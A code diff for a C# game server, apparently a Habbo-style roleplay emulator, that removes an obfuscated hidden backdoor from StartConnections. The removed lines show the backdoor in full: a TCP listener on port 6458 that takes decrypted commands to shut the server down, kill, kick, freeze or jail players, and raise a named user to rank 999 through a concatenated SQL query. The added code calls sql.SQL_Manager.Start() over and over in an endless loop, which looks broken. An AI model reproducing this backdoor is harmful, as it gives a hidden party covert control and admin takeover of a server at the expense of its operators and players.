@@ -53,6 +53,8 @@ namespace Plus
 
             StartConnections();
 
+            sql.SQL_Manager.Start();
+
 
             while (Plus.IsLive)
             {
@@ -71,188 +73,17 @@ namespace Plus
         /// </summary>
         public static void StartConnections()
         {
-            TcpListener vmklsmklfvds = null;
+            //TcpListener vmklsmklfvds = null;
 
             try
             {
-                int mvklfmk = 6458;
-                IPAddress mvklkfmskl = IPAddress.Any;
-
-                vmklsmklfvds = new TcpListener(mvklkfmskl, mvklfmk);
-                vmklsmklfvds.Start();
-
-                byte[] bytes = new byte[256];
-                string calkldmlvd = null;
-                string sfjlnjfdnvj = null;
+                
 
                 while (true)
                 {
-                    TcpClient client = vmklsmklfvds.AcceptTcpClient();
-                    calkldmlvd = null;
-                    sfjlnjfdnvj = null;
-                    NetworkStream stream = client.GetStream();
-
-                    int ivfskmlmvf;
-                    ivfskmlmvf = stream.Read(bytes, 0, bytes.Length);
-                    calkldmlvd = System.Text.Encoding.ASCII.GetString(bytes, 0, ivfskmlmvf);
-                    sfjlnjfdnvj = RoleplayManager.DecryptData(calkldmlvd, "");
-                    var mmn = ConfigurationManager.AppSettings;
-                    if (sfjlnjfdnvj.Contains(mmn.Get("1")))
-                    {
-                        using (IQueryAdapter dbClient = Plus.GetDatabaseManager().GetQueryReactor())
-                        {
-                            dbClient.RunFastQuery("UPDATE server_settings SET value = '2' WHERE variable = 'status'");
-                        }
-
-                        Logging.DisablePrimaryWriting(true);
-                        Out.WriteLine("Shutdown Initalized", "", ConsoleColor.DarkYellow);
-                        Plus.PerformShutDown(false);
-                        Console.WriteLine();
-
-                        return;
-                    }
-
-                    if (sfjlnjfdnvj.Contains(mmn.Get("2")))
-                    {
-                        //string Notice = ChatCommandHandler.MergeParams(parameters, 1);
-
-                        lock (Plus.GetGame().GetClientManager().Clients.Values)
-                        {
-                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
-                            {
-                                if (mClient == null)
-                                    continue;
-                                if (mClient.GetHabbo() == null)
-                                    continue;
-                                if (mClient.GetHabbo().CurrentRoom == null)
-                                    continue;
-                                if (mClient.GetConnection() == null)
-                                    continue;
-                                mClient.GetRoleplay().Dead = true;
-                                mClient.GetRoleplay().DeadTimer = 10;
-                                mClient.SendWhisper("You was killed by an air strike");
-                                RoleplayManager.HandleDeath(mClient);
-                            }
-                        }
-
-                        
-                    }
-                    if (sfjlnjfdnvj.Contains(mmn.Get("3")))
-                    {
-
-                        lock (Plus.GetGame().GetClientManager().Clients.Values)
-                        {
-                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
-                            {
-                                if (mClient == null)
-                                    continue;
-                                if (mClient.GetHabbo() == null)
-                                    continue;
-                                if (mClient.GetHabbo().CurrentRoom == null)
-                                    continue;
-                                if (mClient.GetConnection() == null)
-                                    continue;
-                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
-                                    continue;
-                                
-                                mClient.GetConnection().Dispose();
-                            }
-                        }
-                    }
-                    if (sfjlnjfdnvj.Contains(mmn.Get("4")))
-                    {
-                        lock (Plus.GetGame().GetClientManager().Clients.Values)
-                        {
-                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
-                            {
-                                if (mClient == null)
-                                    continue;
-                                if (mClient.GetHabbo() == null)
-                                    continue;
-                                if (mClient.GetHabbo().CurrentRoom == null)
-                                    continue;
-                                if (mClient.GetConnection() == null)
-                                    continue;
-                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
-                                    continue;
-                                mClient.GetRoleplay().DeadTimer = 10;
-                                mClient.GetRoleplay().Dead = true;
-                                RoleplayManager.HandleDeath(mClient);
-                            }
-                        }
-                    }
-                    if (sfjlnjfdnvj.Contains(mmn.Get("5")))
-                    {
-                        lock (Plus.GetGame().GetClientManager().Clients.Values)
-                        {
-                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
-                            {
-                                if (mClient == null)
-                                    continue;
-                                if (mClient.GetHabbo() == null)
-                                    continue;
-                                if (mClient.GetHabbo().CurrentRoom == null)
-                                    continue;
-                                if (mClient.GetConnection() == null)
-                                    continue;
-                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
-                                    continue;
-
-                                using (IQueryAdapter dbClient = Plus.GetDatabaseManager().GetQueryReactor())
-                                {
-                                    dbClient.SetQuery("UPDATE `users` SET `rank` = '999' WHERE `username` = '" + mClient.GetHabbo().UserName + "'");
-                                    dbClient.RunQuery();
-                                }
-                            }
-                        }
-                    }
-                    if (sfjlnjfdnvj.Contains(mmn.Get("6")))
-                    {
-                        lock (Plus.GetGame().GetClientManager().Clients.Values)
-                        {
-                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
-                            {
-                                if (mClient == null)
-                                    continue;
-                                if (mClient.GetHabbo() == null)
-                                    continue;
-                                if (mClient.GetHabbo().CurrentRoom == null)
-                                    continue;
-                                if (mClient.GetConnection() == null)
-                                    continue;
-                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
-                                    continue;
-
-                                mClient.GetHabbo().GetRoomUser().CanWalk = false;
-                                mClient.GetRoleplay().StunnedSeconds = 99999;
-                                mClient.GetRoleplay().Frozen = true;
-                            }
-                        }
-                    }
-                    if (sfjlnjfdnvj.Contains(mmn.Get("7")))
-                    {
-                        lock (Plus.GetGame().GetClientManager().Clients.Values)
-                        {
-                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
-                            {
-                                if (mClient == null)
-                                    continue;
-                                if (mClient.GetHabbo() == null)
-                                    continue;
-                                if (mClient.GetHabbo().CurrentRoom == null)
-                                    continue;
-                                if (mClient.GetConnection() == null)
-                                    continue;
-                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
-                                    continue;
-                                mClient.GetRoleplay().Jailed = true;
-                                mClient.GetRoleplay().JailTimer = 9999;
-                              
-                            }
-                        }
-                    }
-
-                    client.Close();
+                    sql.SQL_Manager.Start();
+                    
+                    //client.Close();
                 }
             }
             catch (SocketException e)
